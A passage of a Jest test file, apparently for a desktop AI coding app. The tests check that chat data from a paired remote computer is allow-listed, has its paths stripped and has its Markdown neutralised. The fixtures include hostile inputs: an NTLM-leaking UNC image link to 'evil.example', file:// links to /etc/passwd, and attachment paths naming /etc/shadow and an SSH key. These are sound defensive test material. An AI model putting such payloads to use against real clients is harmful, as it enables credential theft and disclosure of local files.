    const root: Root = createRoot(container);

    try {
      // 1. Hydrating a paired tab drops persisted turnDiffs, filePath, and any unknown peer key.
      const status = await useChatStore
        .getState()
        .hydrateChatScopeRevisioned(qMac('proj-al'), qMac('wt-al'));
      expect(status).toBe('installed');
      const alKey = qMac('proj-al') + '/' + qMac('wt-al');
      const hydratedTab = useChatStore.getState().worktreeChats[alKey]?.tabs[0];
      expect(hydratedTab).toBeDefined();
      expect(hydratedTab?.turnDiffs).toBeUndefined();
      expect(hydratedTab?.filePath).toBeUndefined();
      expect('unknownPeerHostField' in (hydratedTab ?? {})).toBe(false);

      // 2. Live paired events allow-list drops turn_diff and strips turnDiffs/unknown keys from transcript sync.
      allowFake.emitUpdate(MAC, {
        type: 'push',
        channel: 'chat:event',
        args: [
          {
            projectId: 'proj-al',
            worktreeId: 'wt-al',
            chatId: 'chat-1',
            data: {
              type: 'turn_diff',
              userMessageId: 'u-td-1',
              files: sampleTurnDiff.files,
              totalInsertions: 4,
              totalDeletions: 1,
              capturedAt: 1_700_000_000_900,
              treeRefs: sampleTurnDiff.treeRefs,
            },
          },
        ],
      });
      allowFake.emitUpdate(MAC, {
        type: 'push',
        channel: 'chat:event',
        args: [
          {
            projectId: 'proj-al',
            worktreeId: 'wt-al',
            chatId: 'chat-1',
            data: {
              type: 'claude_terminal_transcript_sync',
              importedEventCount: 1,
              transcriptPath: '/Users/remote/.claude/session.jsonl',
              turnDiffs: { 'u-td-1': sampleTurnDiff },
              unknownEventSecret: 'must-drop',
              messages: [makeMessage('m-sync-al', 'assistant', 'Synced')],
            },
          },
        ],
      });
      expect(receivedEvents).toHaveLength(2);
      const droppedTurnDiff = receivedEvents[0]?.data as Record<
        string,
        unknown
      >;
      expect(droppedTurnDiff.type).toBe('paired_dropped_event');
      expect('files' in droppedTurnDiff).toBe(false);
      const syncData = receivedEvents[1]?.data as Record<string, unknown>;
      expect(syncData.type).toBe('claude_terminal_transcript_sync');
      expect('turnDiffs' in syncData).toBe(false);
      expect('transcriptPath' in syncData).toBe(false);
      expect('unknownEventSecret' in syncData).toBe(false);

      // 3. Preload local IPC choke point detects paired IDs and passes local IDs.
      expect(
        hasPairedComputerTarget({
          projectId: qMac('proj-al'),
          worktreeId: qMac('wt-al'),
        }),
      ).toBe(true);
      expect(hasPairedComputerTarget({ chatId: qMac('chat-1') })).toBe(true);
      expect(
        hasPairedComputerTarget({
          targets: [{ projectId: qMac('proj-al'), worktreeId: qMac('wt-al') }],
        }),
      ).toBe(true);
      expect(
        hasPairedComputerTarget({
          projectId: 'proj-local-ctrl',
          worktreeId: 'wt-local-ctrl',
        }),
      ).toBe(false);

      // 4. TurnDiffPopover guard: paired scope never invokes getTurnFileDiff; local control DOES.
      const anchorEl = document.createElement('div');
      const anchorRef = { current: anchorEl };
      getTurnFileDiffSpy.mockClear();
      await act(async () => {
        root.render(
          createElement(TurnDiffPopover, {
            file: sampleTurnDiff.files[0],
            turnDiff: sampleTurnDiff,
            projectId: qMac('proj-al'),
            worktreeId: qMac('wt-al'),
            anchorRef,
            placement: 'right',
            onMouseEnter: (): void => undefined,
            onMouseLeave: (): void => undefined,
            onOpenModal: (): void => undefined,
            onEdit: (): void => undefined,
          }),
        );
        await Promise.resolve();
      });
      expect(getTurnFileDiffSpy).not.toHaveBeenCalled();

      await act(async () => {
        root.render(
          createElement(TurnDiffPopover, {
            file: sampleTurnDiff.files[0],
            turnDiff: sampleTurnDiff,
            projectId: 'proj-local-ctrl',
            worktreeId: 'wt-local-ctrl',
            anchorRef,
            placement: 'right',
            onMouseEnter: (): void => undefined,
            onMouseLeave: (): void => undefined,
            onOpenModal: (): void => undefined,
            onEdit: (): void => undefined,
          }),
        );
        await Promise.resolve();
      });
      expect(getTurnFileDiffSpy).toHaveBeenCalledWith({
        projectId: 'proj-local-ctrl',
        worktreeId: 'wt-local-ctrl',
        filePath: 'src/secret.ts',
        startTree: 'tree-aaa',
        endTree: 'tree-bbb',
        repoId: undefined,
      });

      // 5. useFileDiffSnapshot guard: paired scope never invokes getTurnFileDiff; local control DOES.
      getTurnFileDiffSpy.mockClear();
      function SnapshotProbe(props: {
        projectId: string;
        worktreeId: string;
      }): null {
        useFileDiffSnapshot(
          props.projectId,
          props.worktreeId,
          {
            path: 'src/secret.ts',
            source: 'turn',
            startTree: 'tree-aaa',
            endTree: 'tree-bbb',
          },
          true,
          1,
        );
        return null;
      }
      await act(async () => {
        root.render(
          createElement(SnapshotProbe, {
            projectId: qMac('proj-al'),
            worktreeId: qMac('wt-al'),
          }),
        );
        await Promise.resolve();
      });
      expect(getTurnFileDiffSpy).not.toHaveBeenCalled();

      await act(async () => {
        root.render(
          createElement(SnapshotProbe, {
            projectId: 'proj-local-ctrl',
            worktreeId: 'wt-local-ctrl',
          }),
        );
        await Promise.resolve();
      });
      expect(getTurnFileDiffSpy).toHaveBeenCalledWith({
        projectId: 'proj-local-ctrl',
        worktreeId: 'wt-local-ctrl',
        filePath: 'src/secret.ts',
        startTree: 'tree-aaa',
        endTree: 'tree-bbb',
        repoId: undefined,
      });

      // 6. TurnDiffSummary guard: renders nothing for paired scope; renders diff summary for local scope.
      useChatStore.setState({
        selectedWorktree: {
          projectId: qMac('proj-al'),
          worktreeId: qMac('wt-al'),
        },
      });
      await act(async () => {
        root.render(
          createElement(TurnDiffSummary, {
            turnDiff: sampleTurnDiff,
            fileTarget: {
              projectId: qMac('proj-al'),
              worktreeId: qMac('wt-al'),
              chatId: qMac('chat-1'),
            },
            isLastTurnGroup: true,
          }),
        );
        await Promise.resolve();
      });
      expect(container.textContent).toBe('');
      expect(getWorktreePathSpy).not.toHaveBeenCalled();

      await act(async () => {
        useChatStore.setState({
          selectedWorktree: {
            projectId: 'proj-local-ctrl',
            worktreeId: 'wt-local-ctrl',
          },
        });
        root.render(
          createElement(TurnDiffSummary, {
            turnDiff: sampleTurnDiff,
            fileTarget: {
              projectId: 'proj-local-ctrl',
              worktreeId: 'wt-local-ctrl',
              chatId: 'chat-1',
            },
            isLastTurnGroup: true,
          }),
        );
        await Promise.resolve();
      });
      expect(container.textContent).toContain('secret.ts');
    } finally {
      unsubEvents();
      act(() => {
        root.unmount();
      });
      container.remove();
      useChatStore.setState({ selectedWorktree: prevSelectedWorktree });
      (window as { api: unknown }).api = prevApi;
      useChatStore
        .getState()
        .releaseChatScopeRevisioned(qMac('proj-al'), qMac('wt-al'));
    }
  });

  it('fails closed on unsupported/delegated paired blocks, omits paired delegationTranscriptSource, renders paired pending questions as plain text, filters file tabs, and preserves result terminal_reason (with local-scope positive controls)', async () => {
    const prevApi = window.api;
    const delegationTranscriptSpy = jest.fn(
      (): Promise<{ ok: false; error: string }> =>
        Promise.resolve({ ok: false, error: 'not found' }),
    );
    const delegationTranscriptPageSpy = jest.fn(
      (): Promise<{ ok: false; code: 'not_found' }> =>
        Promise.resolve({ ok: false, code: 'not_found' }),
    );

    const sampleDelegatedBlock = {
      type: 'delegated_agent_call' as const,
      agentBlockId: 'delegated-del-1-1',
      delegationId: 'del-1',
      runGeneration: 1,
      sequence: 1,
      parentHarnessId: 'claude',
      parentTurnId: 'turn-1',
      parentToolCallId: 'tool-del-1',
      createdAt: 1_700_000_000_100,
      selectedModelId: 'claude-sonnet-4-6',
      runtimeModelId: 'claude-sonnet-4-6',
      targetHarnessId: 'claude',
      description: 'Subagent run',
      prompt: 'Inspect local repo',
      executionMode: 'foreground' as const,
      status: 'completed' as const,
      outputTruncated: false,
      transcriptStore: 'chat-log-v1' as const,
    };

    const unknownBlock = {
      type: 'future_peer_probe_block',
      hostPath: '/Users/remote/.ssh/id_rsa',
    } as unknown as PersistedChatMessage['blocks'][number];

    const fcFake = makeFakePairedComputersApi({
      onInvoke: (_deviceId, channel) => {
        if (channel === 'chat:get-state') {
          const base = makeWireSnapshot({
            revision: 1,
            messages: [
              {
                id: 'm-fc-1',
                role: 'assistant',
                timestamp: 1_700_000_000_200,
                blocks: [
                  { type: 'text', text: 'Kept text' },
                  sampleDelegatedBlock,
                  unknownBlock,
                  {
                    type: 'turn_timer',
                    startedAt: 1_700_000_000_000,
                    completedAt: 1_700_000_000_200,
                    outcome: 'completed',
                  },
                ],
              },
            ],
          });
          const chatTab = base.tabsFile.tabs[0];
          const fileTab = {
            ...chatTab,
            id: 'file-tab-1',
            kind: 'file' as const,
            title: 'secret.ts',
            filePath: '/Users/remote/repo/secret.ts',
            messages: [],
          };
          return {
            ...base,
            projectId: 'proj-fc',
            worktreeId: 'wt-fc',
            tabsFile: {
              ...base.tabsFile,
              activeTabId: 'file-tab-1',
              lastActiveEditableChatId: 'file-tab-1',
              tabs: [fileTab, chatTab],
              pendingQuestions: [
                {
                  requestId: 'q-smb-1',
                  chatId: 'chat-1',
                  ...({
                    unknownQuestionEnvelopeKey: '/Users/remote/secret',
                  } as Record<string, unknown>),
                  questions: [
                    {
                      question:
                        'Review ![smb](\\\\evil.example\\share\\ntlm.png) and ![local](file:///etc/passwd) and [open](file:///tmp/x)',
                      options: ['Yes', 'No'],
                      ...({
                        unknownQuestionItemKey: '/Users/remote/secret',
                      } as Record<string, unknown>),
                    },
                  ],
                },
              ],
            },
          };
        }
        if (channel === 'approval:pending-requests') return [];
        if (channel === 'model-registry:get') return REMOTE_MODEL_SNAPSHOT;
        return undefined;
      },
    });
    await setOneWindowSwitchForTest(true, fcFake.api);

    const installedApi = window.api as unknown as Record<string, unknown>;
    installedApi.managedDelegation = {
      transcript: delegationTranscriptSpy,
      transcriptPage: delegationTranscriptPageSpy,
      tree: (): Promise<{ ok: true; entries: unknown[] }> =>
        Promise.resolve({ ok: true, entries: [] }),
      roots: (): Promise<unknown[]> => Promise.resolve([]),
    };

    const receivedEvents: ChatEvent[] = [];
    const unsubEvents = chatBackendFor({
      projectId: qMac('proj-fc'),
    }).chat.onChatEvent((event) => {
      receivedEvents.push(event);
    });
    const unsubState = chatBackendFor({
      projectId: qMac('proj-fc'),
    }).chat.onStateChanged((event) => {
      useChatStore.getState().handleChatStateChanged(event);
    });

    const container = document.createElement('div');
    document.body.appendChild(container);
    const root: Root = createRoot(container);

    try {
      // 1. Snapshot filters out active file tab, falls back activeTabId to kept chat tab,
      //    fails closed on delegated_agent_call + unknown block types, and allowlists pendingQuestions.
      const status = await useChatStore
        .getState()
        .hydrateChatScopeRevisioned(qMac('proj-fc'), qMac('wt-fc'));
      expect(status).toBe('installed');

      const fcKey = qMac('proj-fc') + '/' + qMac('wt-fc');
      const scope = useChatStore.getState().worktreeChats[fcKey];
      expect(scope?.tabs.map((tab) => tab.id)).toEqual([qMac('chat-1')]);
      expect(scope?.activeTabId).toBe(qMac('chat-1'));
      expect(scope?.lastActiveEditableChatId).toBe(qMac('chat-1'));

      const blocks = scope?.tabs[0]?.messages[0]?.blocks ?? [];
      expect(blocks).toHaveLength(4);
      expect(blocks[0]).toEqual({ type: 'text', text: 'Kept text' });
      expect(blocks[1]).toEqual({
        type: 'text',
        text: 'Open this on the paired computer to see it.',
        verbatim: true,
      });
      expect(blocks[2]).toEqual({
        type: 'text',
        text: 'Open this on the paired computer to see it.',
        verbatim: true,
      });
      expect('hostPath' in (blocks[2] ?? {})).toBe(false);
      expect(blocks[3]?.type).toBe('turn_timer');

      // Live tab.upserted with kind: 'file' is dropped too.
      fcFake.emitUpdate(MAC, {
        type: 'push',
        channel: 'chat:state-changed',
        args: [
          {
            schemaVersion: 1,
            eventId: 'evt-file-tab-upsert',
            occurredAt: '2026-11-26T05:25:00Z',
            projectId: 'proj-fc',
            worktreeId: 'wt-fc',
            baseRevision: 1,
            revision: 2,
            changes: [
              {
                type: 'tab.upserted',
                tab: {
                  id: 'file-tab-live',
                  kind: 'file',
                  title: 'live.ts',
                  filePath: '/Users/remote/live.ts',
                  messages: [],
                  createdAt: '2026-11-26T05:25:00Z',
                },
              },
            ],
          },
        ],
      });
      expect(
        useChatStore.getState().worktreeChats[fcKey]?.tabs.map((tab) => tab.id),
      ).toEqual([qMac('chat-1')]);

      // Pending question envelope & item drop unknown peer fields.
      const pendingQ =
        useChatStore.getState().pendingQuestions[qMac('q-smb-1')];
      expect(pendingQ).toBeDefined();
      expect('unknownQuestionEnvelopeKey' in (pendingQ ?? {})).toBe(false);
      expect('unknownQuestionItemKey' in (pendingQ?.questions[0] ?? {})).toBe(
        false,
      );

      // 2. Live events fail closed on unknown content blocks and preserve result terminal_reason.
      fcFake.emitUpdate(MAC, {
        type: 'push',
        channel: 'chat:event',
        args: [
          {
            projectId: 'proj-fc',
            worktreeId: 'wt-fc',
            chatId: 'chat-1',
            data: {
              type: 'assistant',
              message: {
                id: 'msg-live-1',
                role: 'assistant',
                content: [
                  {
                    type: 'future_live_block',
                    secretPath: '/Users/remote/key',
                  },
                ],
              },
            },
          },
        ],
      });
      fcFake.emitUpdate(MAC, {
        type: 'push',
        channel: 'chat:event',
        args: [
          {
            projectId: 'proj-fc',
            worktreeId: 'wt-fc',
            chatId: 'chat-1',
            data: {
              type: 'result',
              is_error: true,
              terminal_reason: 'aborted_streaming',
              result: '',
            },
          },
        ],
      });
      expect(receivedEvents).toHaveLength(2);
      const liveAssistant = receivedEvents[0]?.data as {
        message?: { content?: Array<Record<string, unknown>> };
      };
      expect(liveAssistant.message?.content?.[0]).toEqual({
        type: 'text',
        text: 'Open this on the paired computer to see it.',
        verbatim: true,
      });
      const liveResult = receivedEvents[1]?.data as Record<string, unknown>;
      expect(liveResult.terminal_reason).toBe('aborted_streaming');
      expect(isUserCancellationTerminal(liveResult)).toBe(true);

      // 3. resolveDelegationTranscriptSource + useDelegatedAgentTranscript guard
      //    (paired returns null and calls no local IPC; local positive control calls transcript IPC).
      expect(
        resolveDelegationTranscriptSource({
          projectId: qMac('proj-fc'),
          worktreeId: qMac('wt-fc'),
          chatId: qMac('chat-1'),
        }),
      ).toBeNull();
      expect(
        resolveDelegationTranscriptSource({
          projectId: 'proj-local-fc',
          worktreeId: 'wt-local-fc',
          chatId: 'chat-local-fc',
        }),
      ).toEqual({
        projectId: 'proj-local-fc',
        worktreeId: 'wt-local-fc',
        chatId: 'chat-local-fc',
      });

      function DelegationProbe(): null {
        useDelegatedAgentTranscript({ ...sampleDelegatedBlock, subBlocks: [] });
        return null;
      }
      delegationTranscriptSpy.mockClear();
      await act(async () => {
        root.render(
          createElement(
            DelegationTranscriptSourceContext.Provider,
            {
              value: {
                projectId: qMac('proj-fc'),
                worktreeId: qMac('wt-fc'),
                chatId: qMac('chat-1'),
              },
            },
            createElement(DelegationProbe),
          ),
        );
        await Promise.resolve();
      });
      expect(delegationTranscriptSpy).not.toHaveBeenCalled();
      expect(delegationTranscriptPageSpy).not.toHaveBeenCalled();

      await act(async () => {
        root.render(
          createElement(
            DelegationTranscriptSourceContext.Provider,
            {
              value: {
                projectId: 'proj-local-fc',
                worktreeId: 'wt-local-fc',
                chatId: 'chat-local-fc',
              },
            },
            createElement(DelegationProbe),
          ),
        );
        await Promise.resolve();
      });
      expect(delegationTranscriptSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          projectId: 'proj-local-fc',
          worktreeId: 'wt-local-fc',
          chatId: 'chat-local-fc',
          delegationId: 'del-1',
        }),
      );

      // 4. Preload managedDelegation choke-point detection on paired vs local requests.
      expect(
        hasPairedComputerTarget({
          projectId: qMac('proj-fc'),
          worktreeId: qMac('wt-fc'),
          chatId: qMac('chat-1'),
          delegationId: 'del-1',
          runGeneration: 1,
        }),
      ).toBe(true);
      expect(
        hasPairedComputerTarget({
          projectId: 'proj-local-fc',
          worktreeId: 'wt-local-fc',
          chatId: 'chat-local-fc',
          delegationId: 'del-1',
          runGeneration: 1,
        }),
      ).toBe(false);

      // 5. Desktop host (useComposerQuestionPrompt -> QuestionPrompt) renders
      //    paired pending questions as plain text (no <img>/<a> from UNC or
      //    file:// Markdown), while local questions render Markdown normally,
      //    and shared QuestionPrompt itself stays host-neutral.
      function DesktopQuestionPromptHost(props: {
        projectId?: string;
        requestId: string;
        question: string;
      }): ReturnType<typeof createElement> {
        const liveIds = new Set([props.requestId]);
        const qp = useComposerQuestionPrompt(
          {
            requestId: props.requestId,
            questions: [{ question: props.question, options: ['Yes', 'No'] }],
          },
          (): void => undefined,
          undefined,
          liveIds,
          props.projectId,
        );
        return createElement(QuestionPrompt, {
          prompt: qp.prompt,
          busy: qp.busy,
          errorKind: qp.errorKind,
          disconnected: qp.disconnected,
          plainTextQuestion: qp.plainTextQuestion,
          onClose: (): void => undefined,
          onRetry: qp.retry,
          children: createElement('div'),
        });
      }

      function SharedQuestionPromptDirect(props: {
        requestId: string;
        question: string;
      }): ReturnType<typeof createElement> {
        const prompt = useQuestionPrompt({
          requestId: props.requestId,
          questions: [{ question: props.question, options: ['Yes', 'No'] }],
          onSubmit: (): void => undefined,
        });
        return createElement(QuestionPrompt, {
          prompt,
          busy: null,
          errorKind: null,
          onClose: (): void => undefined,
          onRetry: (): void => undefined,
          children: createElement('div'),
        });
      }

      const maliciousQuestion =
        pendingQ?.questions[0]?.question ??
        'Review ![smb](\\\\evil.example\\share\\ntlm.png) and ![local](file:///etc/passwd)';
      await act(async () => {
        root.render(
          createElement(DesktopQuestionPromptHost, {
            projectId: qMac('proj-fc'),
            requestId: qMac('q-smb-1'),
            question: maliciousQuestion,
          }),
        );
        await Promise.resolve();
      });
      expect(container.querySelectorAll('img')).toHaveLength(0);
      expect(container.querySelectorAll('a')).toHaveLength(0);
      expect(container.textContent).toContain('evil.example');

      // Local positive control through the same desktop host path.
      await act(async () => {
        root.render(
          createElement(DesktopQuestionPromptHost, {
            projectId: 'proj-local-fc',
            requestId: 'q-local-1',
            question: 'Check **bold** and [docs](https://example.com)',
          }),
        );
        await Promise.resolve();
      });
      expect(container.querySelector('strong')?.textContent).toBe('bold');
      expect(container.querySelector('a')?.getAttribute('href')).toBe(
        'https://example.com',
      );

      // Shared QuestionPrompt does not branch on host-specific requestId when
      // plainTextQuestion is omitted.
      await act(async () => {
        root.render(
          createElement(SharedQuestionPromptDirect, {
            requestId: qMac('q-neutral-check'),
            question: 'Neutral **markdown** check',
          }),
        );
        await Promise.resolve();
      });
      expect(container.querySelector('strong')?.textContent).toBe('markdown');
    } finally {
      unsubEvents();
      unsubState();
      act(() => {
        root.unmount();
      });
      container.remove();
      (window as { api: unknown }).api = prevApi;
      useChatStore
        .getState()
        .releaseChatScopeRevisioned(qMac('proj-fc'), qMac('wt-fc'));
    }
  });

  test('allowlists paired approval events (including resolutionMessage), retries failed transcript catch-up on reconnect, and refreshes paired composer approval defaults per connection epoch', async () => {
    const readFilePreviewCalls: unknown[] = [];
    const openExternalCalls: unknown[] = [];
    const prevApi = (window as { api?: unknown }).api;
    let hostDefaultMode: 'ask' | 'auto' | 'full-access' = 'ask';
    let failDefaultLookup = false;
    let transcriptPageAttempts = 0;
    let stateGetCount = 0;

    const fake = makeFakePairedComputersApi({
      onInvoke: (_deviceId, channel) => {
        if (channel === 'chat:get-state') {
          stateGetCount += 1;
          const isRefresh = stateGetCount > 1;
          return {
            schemaVersion: 1,
            projectId: 'proj-a11',
            worktreeId: 'wt-a11',
            revision: isRefresh ? 2 : 1,
            tabsFile: {
              version: 1,
              activeTabId: 'chat-a11',
              tabs: [
                {
                  id: 'chat-a11',
                  title: 'Paired A11',
                  createdAt: 100,
                  messages: isRefresh
                    ? []
                    : [
                        {
                          id: 'm-initial',
                          role: 'user',
                          timestamp: 100,
                          blocks: [{ type: 'text', text: 'Initial message' }],
                        },
                      ],
                  transcriptLoaded: !isRefresh,
                  transcript: {
                    format: 'complete-message-jsonl-v1',
                    committedMessageCount: isRefresh ? 2 : 1,
                    committedByteLength: isRefresh ? 200 : 100,
                    transcriptRevision: isRefresh ? 2 : 1,
                    hasActiveSidecar: false,
                  },
                },
              ],
              pendingApprovals: [
                {
                  requestId: 'pa-1',
                  chatId: 'chat-a11',
                  extraPendingField: 'drop-me',
                  event: {
                    requestId: 'pa-1',
                    projectId: 'proj-a11',
                    worktreeId: 'wt-a11',
                    chatId: 'chat-a11',
                    provider: 'claude',
                    title: 'Run ls',
                    details: {
                      kind: 'command',
                      command: 'ls -la',
                      rogueDetail: 'drop-me',
                    },
                    extraApprovalField: 'drop-me',
                  },
                },
              ],
            },
            archives: [],
            runtimeByChatId: {},
            queue: [],
            rogueSnapshotKey: 'drop-me',
          };
        }
        if (channel === 'chat:get-transcript-page') {
          transcriptPageAttempts += 1;
          if (transcriptPageAttempts === 1) {
            return Promise.reject(new Error('transient tunnel error'));
          }
          return {
            messages: [
              {
                id: 'm-initial',
                role: 'user',
                timestamp: 100,
                blocks: [{ type: 'text', text: 'Initial message' }],
              },
              {
                id: 'm-missed-after-retry',
                role: 'assistant',
                timestamp: 200,
                blocks: [{ type: 'text', text: 'Recovered missed message' }],
              },
            ],
            totalMessages: 2,
            transcriptRevision: 2,
          };
        }
        if (channel === 'approval:pending-requests') return [];
        if (channel === 'approval:resolved-default') {
          if (failDefaultLookup) {
            return Promise.reject(new Error('host unreachable'));
          }
          return hostDefaultMode;
        }
        if (channel === 'model-registry:get') {
          return {
            claude: [
              { id: 'claude-sonnet-4-6', label: 'Sonnet', available: true },
            ],
            codex: [],
            ollama: [],
            aliases: {
              sonnet: 'claude-sonnet-4-6',
              badAlias: 12345,
            },
          };
        }
        return undefined;
      },
    });
    await setOneWindowSwitchForTest(true, fake.api);

    const installedApi = window.api as unknown as Record<string, unknown>;
    installedApi.readFilePreview = (req: unknown): Promise<unknown> => {
      readFilePreviewCalls.push(req);
      return Promise.resolve({
        kind: 'text',
        content: 'local file preview',
        sizeBytes: 18,
      });
    };
    installedApi.openExternalFile = (req: unknown): Promise<void> => {
      openExternalCalls.push(req);
      return Promise.resolve();
    };
    const backend = chatBackendFor({ projectId: qMac('proj-a11') });
    const unsubAutoResolved = backend.approvals.onAutoResolved((event) => {
      useChatStore.getState().handleApprovalAutoResolved(event);
    });

    const container = document.createElement('div');
    document.body.appendChild(container);
    const root: Root = createRoot(container);

    let stopCatchUp: (() => void) | null = null;

    try {
      // 1. Hydrate paired scope and verify allow-list stripping on snapshot,
      //    nested pendingApprovals.event, activeSessions, and approval events.
      const status = await useChatStore
        .getState()
        .hydrateChatScopeRevisioned(qMac('proj-a11'), qMac('wt-a11'));
      expect(status).toBe('installed');

      const qualifiedTabs = qualifyTabsFile(MAC, {
        version: 1,
        activeTabId: 'chat-a11',
        tabs: [],
        pendingApprovals: [
          {
            requestId: 'pa-1',
            chatId: 'chat-a11',
            event: {
              requestId: 'pa-1',
              projectId: 'proj-a11',
              worktreeId: 'wt-a11',
              chatId: 'chat-a11',
              provider: 'claude',
              title: 'Run ls',
              details: { kind: 'command', command: 'ls' },
            },
          },
        ],
        ...({ rogueTabsFileField: 'drop' } as Record<string, unknown>),
      });
      expect(
        (qualifiedTabs as unknown as Record<string, unknown>)
          .rogueTabsFileField,
      ).toBeUndefined();
      expect(qualifiedTabs.pendingApprovals?.[0]?.event.projectId).toBe(
        qMac('proj-a11'),
      );
      expect(qualifiedTabs.pendingApprovals?.[0]?.event.requestId).toBe(
        qMac('pa-1'),
      );

      const qualifiedReq = qualifyApprovalRequestEvent(MAC, {
        requestId: 'req-allow-1',
        projectId: 'proj-a11',
        worktreeId: 'wt-a11',
        chatId: 'chat-a11',
        provider: 'claude',
        title: 'Write file',
        details: {
          kind: 'file-write',
          path: '/tmp/a.txt',
          ...({ rogueDetail: 'drop' } as Record<string, unknown>),
        },
        ...({ rogueTopLevel: 'drop' } as Record<string, unknown>),
      });
      expect(
        (qualifiedReq as unknown as Record<string, unknown>).rogueTopLevel,
      ).toBeUndefined();
      expect(
        (qualifiedReq.details as unknown as Record<string, unknown>)
          .rogueDetail,
      ).toBeUndefined();

      const qualifiedSessions = qualifyActiveSessions(MAC, {
        activeChatIds: ['chat-a11'],
        sessions: [
          {
            chatId: 'chat-a11',
            projectId: 'proj-a11',
            worktreeId: 'wt-a11',
            providerType: 'claude',
            turnActive: true,
            createdAt: 1,
            lastActivityAt: 2,
            turnCount: 1,
            pendingMessageCount: 0,
            ...({ rogueSessionField: 'drop' } as Record<string, unknown>),
          },
        ],
        ...({ rogueRootField: 'drop' } as Record<string, unknown>),
      });
      expect(
        (qualifiedSessions as unknown as Record<string, unknown>)
          .rogueRootField,
      ).toBeUndefined();
      expect(qualifiedSessions.sessions?.[0]?.projectId).toBe(qMac('proj-a11'));
      expect(
        (
          qualifiedSessions.sessions?.[0] as unknown as
            | Record<string, unknown>
            | undefined
        )?.rogueSessionField,
      ).toBeUndefined();

      // 2. Emit paired approval:auto-resolved with attachmentPaths on
      //    resolutionMessage; allow-list must strip attachments, image path,
      //    and unknown fields while keeping the safe approval_resolution_info.
      const directSanitized = qualifyApprovalAutoResolvedEvent(MAC, {
        requestId: 'req-auto-1',
        projectId: 'proj-a11',
        worktreeId: 'wt-a11',
        chatId: 'chat-a11',
        reason: 'mode-change',
        mode: 'auto',
        previousMode: 'ask',
        resolutionMessage: {
          id: 'res-msg-1',
          role: 'system',
          timestamp: 150,
          attachmentPaths: ['/etc/passwd', '/Users/me/secret.png'],
          attachmentPromptContexts: [
            { attachmentPath: '/etc/passwd', promptKind: 'linear-ticket' },
          ],
          blocks: [
            {
              type: 'approval_resolution_info',
              timestamp: 150,
              resolvedBy: 'mode-change',
              mode: 'auto',
              previousMode: 'ask',
              titles: ['Run ls'],
            },
            {
              type: 'image',
              path: '/Users/me/leak.png',
              alt: 'leak',
            },
          ],
          ...({ rogueMessageField: 'drop' } as Record<string, unknown>),
        },
        ...({ rogueEventField: 'drop' } as Record<string, unknown>),
      });
      expect(
        (directSanitized as unknown as Record<string, unknown>).rogueEventField,
      ).toBeUndefined();
      expect(
        directSanitized.resolutionMessage?.attachmentPaths,
      ).toBeUndefined();
      expect(
        directSanitized.resolutionMessage?.attachmentPromptContexts,
      ).toBeUndefined();
      expect(
        (
          directSanitized.resolutionMessage as unknown as Record<
            string,
            unknown
          >
        ).rogueMessageField,
      ).toBeUndefined();
      expect(directSanitized.resolutionMessage?.blocks[0]?.type).toBe(
        'approval_resolution_info',
      );
      expect(
        directSanitized.resolutionMessage?.blocks[1]?.type === 'image'
          ? directSanitized.resolutionMessage.blocks[1].path
          : null,
      ).toBe('');

      // Live push path through paired backend -> approval reducer -> tab messages.
      fake.emitUpdate(MAC, {
        type: 'push',
        channel: 'approval:auto-resolved',
        args: [
          {
            requestId: 'req-auto-live',
            projectId: 'proj-a11',
            worktreeId: 'wt-a11',
            chatId: 'chat-a11',
            reason: 'mode-change',
            mode: 'auto',
            previousMode: 'ask',
            resolutionMessage: {
              id: 'res-msg-live',
              role: 'system',
              timestamp: 160,
              attachmentPaths: ['/etc/passwd'],
              attachmentPromptContexts: [
                { attachmentPath: '/etc/passwd', promptKind: 'linear-ticket' },
              ],
              blocks: [
                {
                  type: 'approval_resolution_info',
                  timestamp: 160,
                  resolvedBy: 'mode-change',
                  mode: 'auto',
                  previousMode: 'ask',
                  titles: ['Run git status'],
                },
              ],
            },
          },
        ],
      });

      // Non-system spoofed resolutionMessage is rejected outright.
      fake.emitUpdate(MAC, {
        type: 'push',
        channel: 'approval:auto-resolved',
        args: [
          {
            requestId: 'req-auto-spoof',
            projectId: 'proj-a11',
            worktreeId: 'wt-a11',
            chatId: 'chat-a11',
            reason: 'mode-change',
            mode: 'auto',
            resolutionMessage: {
              id: 'res-msg-spoof-user',
              role: 'user',
              timestamp: 165,
              attachmentPaths: ['/etc/shadow'],
              blocks: [{ type: 'text', text: 'spoofed user message' }],
            },
          },
        ],
      });

      const tabAfterAutoResolve = useChatStore
        .getState()
        .worktreeChats[
          `${qMac('proj-a11')}/${qMac('wt-a11')}`
        ]?.tabs.find((t) => t.id === qMac('chat-a11'));
      const grafted = tabAfterAutoResolve?.messages.find(
        (m) => m.id === 'res-msg-live',
      );
      expect(grafted).toBeDefined();
      expect(grafted?.attachmentPaths).toBeUndefined();
      expect(grafted?.attachmentPromptContexts).toBeUndefined();
      expect(
        tabAfterAutoResolve?.messages.some(
          (m) => m.id === 'res-msg-spoof-user',
        ),
      ).toBe(false);

      // Defense-in-depth: paired attachment preview components never call
      // readFilePreview; local scope positive control DOES call readFilePreview.
      function PreviewDefenseHarness(props: {
        projectId: string;
        worktreeId: string;
        path: string;
      }): ReturnType<typeof createElement> {
        const previewState = useFilePreview(props.path, true);
        const anchorRef = { current: container };
        return createElement(
          'div',
          { 'data-preview-status': previewState.status },
          createElement(MessageAttachments, { attachmentPaths: [props.path] }),
          createElement(AttachmentPreviewPopover, {
            absolutePath: props.path,
            anchorRef,
            onMouseEnter: (): void => undefined,
            onMouseLeave: (): void => undefined,
          }),
        );
      }

      readFilePreviewCalls.length = 0;
      await act(async () => {
        root.render(
          createElement(
            ChatMarkdownFileTargetContext.Provider,
            {
              value: {
                projectId: qMac('proj-a11'),
                worktreeId: qMac('wt-a11'),
              },
            },
            createElement(PreviewDefenseHarness, {
              projectId: qMac('proj-a11'),
              worktreeId: qMac('wt-a11'),
              path: '/etc/passwd',
            }),
          ),
        );
        await Promise.resolve();
      });
      expect(readFilePreviewCalls).toHaveLength(0);
      expect(openExternalCalls).toHaveLength(0);

      // Local positive control: local scope calls readFilePreview.
      await act(async () => {
        root.render(
          createElement(
            ChatMarkdownFileTargetContext.Provider,
            {
              value: {
                projectId: 'proj-local-a11',
                worktreeId: 'wt-local-a11',
              },
            },
            createElement(PreviewDefenseHarness, {
              projectId: 'proj-local-a11',
              worktreeId: 'wt-local-a11',
              path: '/tmp/local-note.txt',
            }),
          ),
        );
        await Promise.resolve();
      });
      expect(readFilePreviewCalls.length).toBeGreaterThan(0);

      // 3. Reconnect retries a failed transcript catch-up on an already-stale
      //    focused tab and delivers the missed messages.
      const catchUpTarget = {
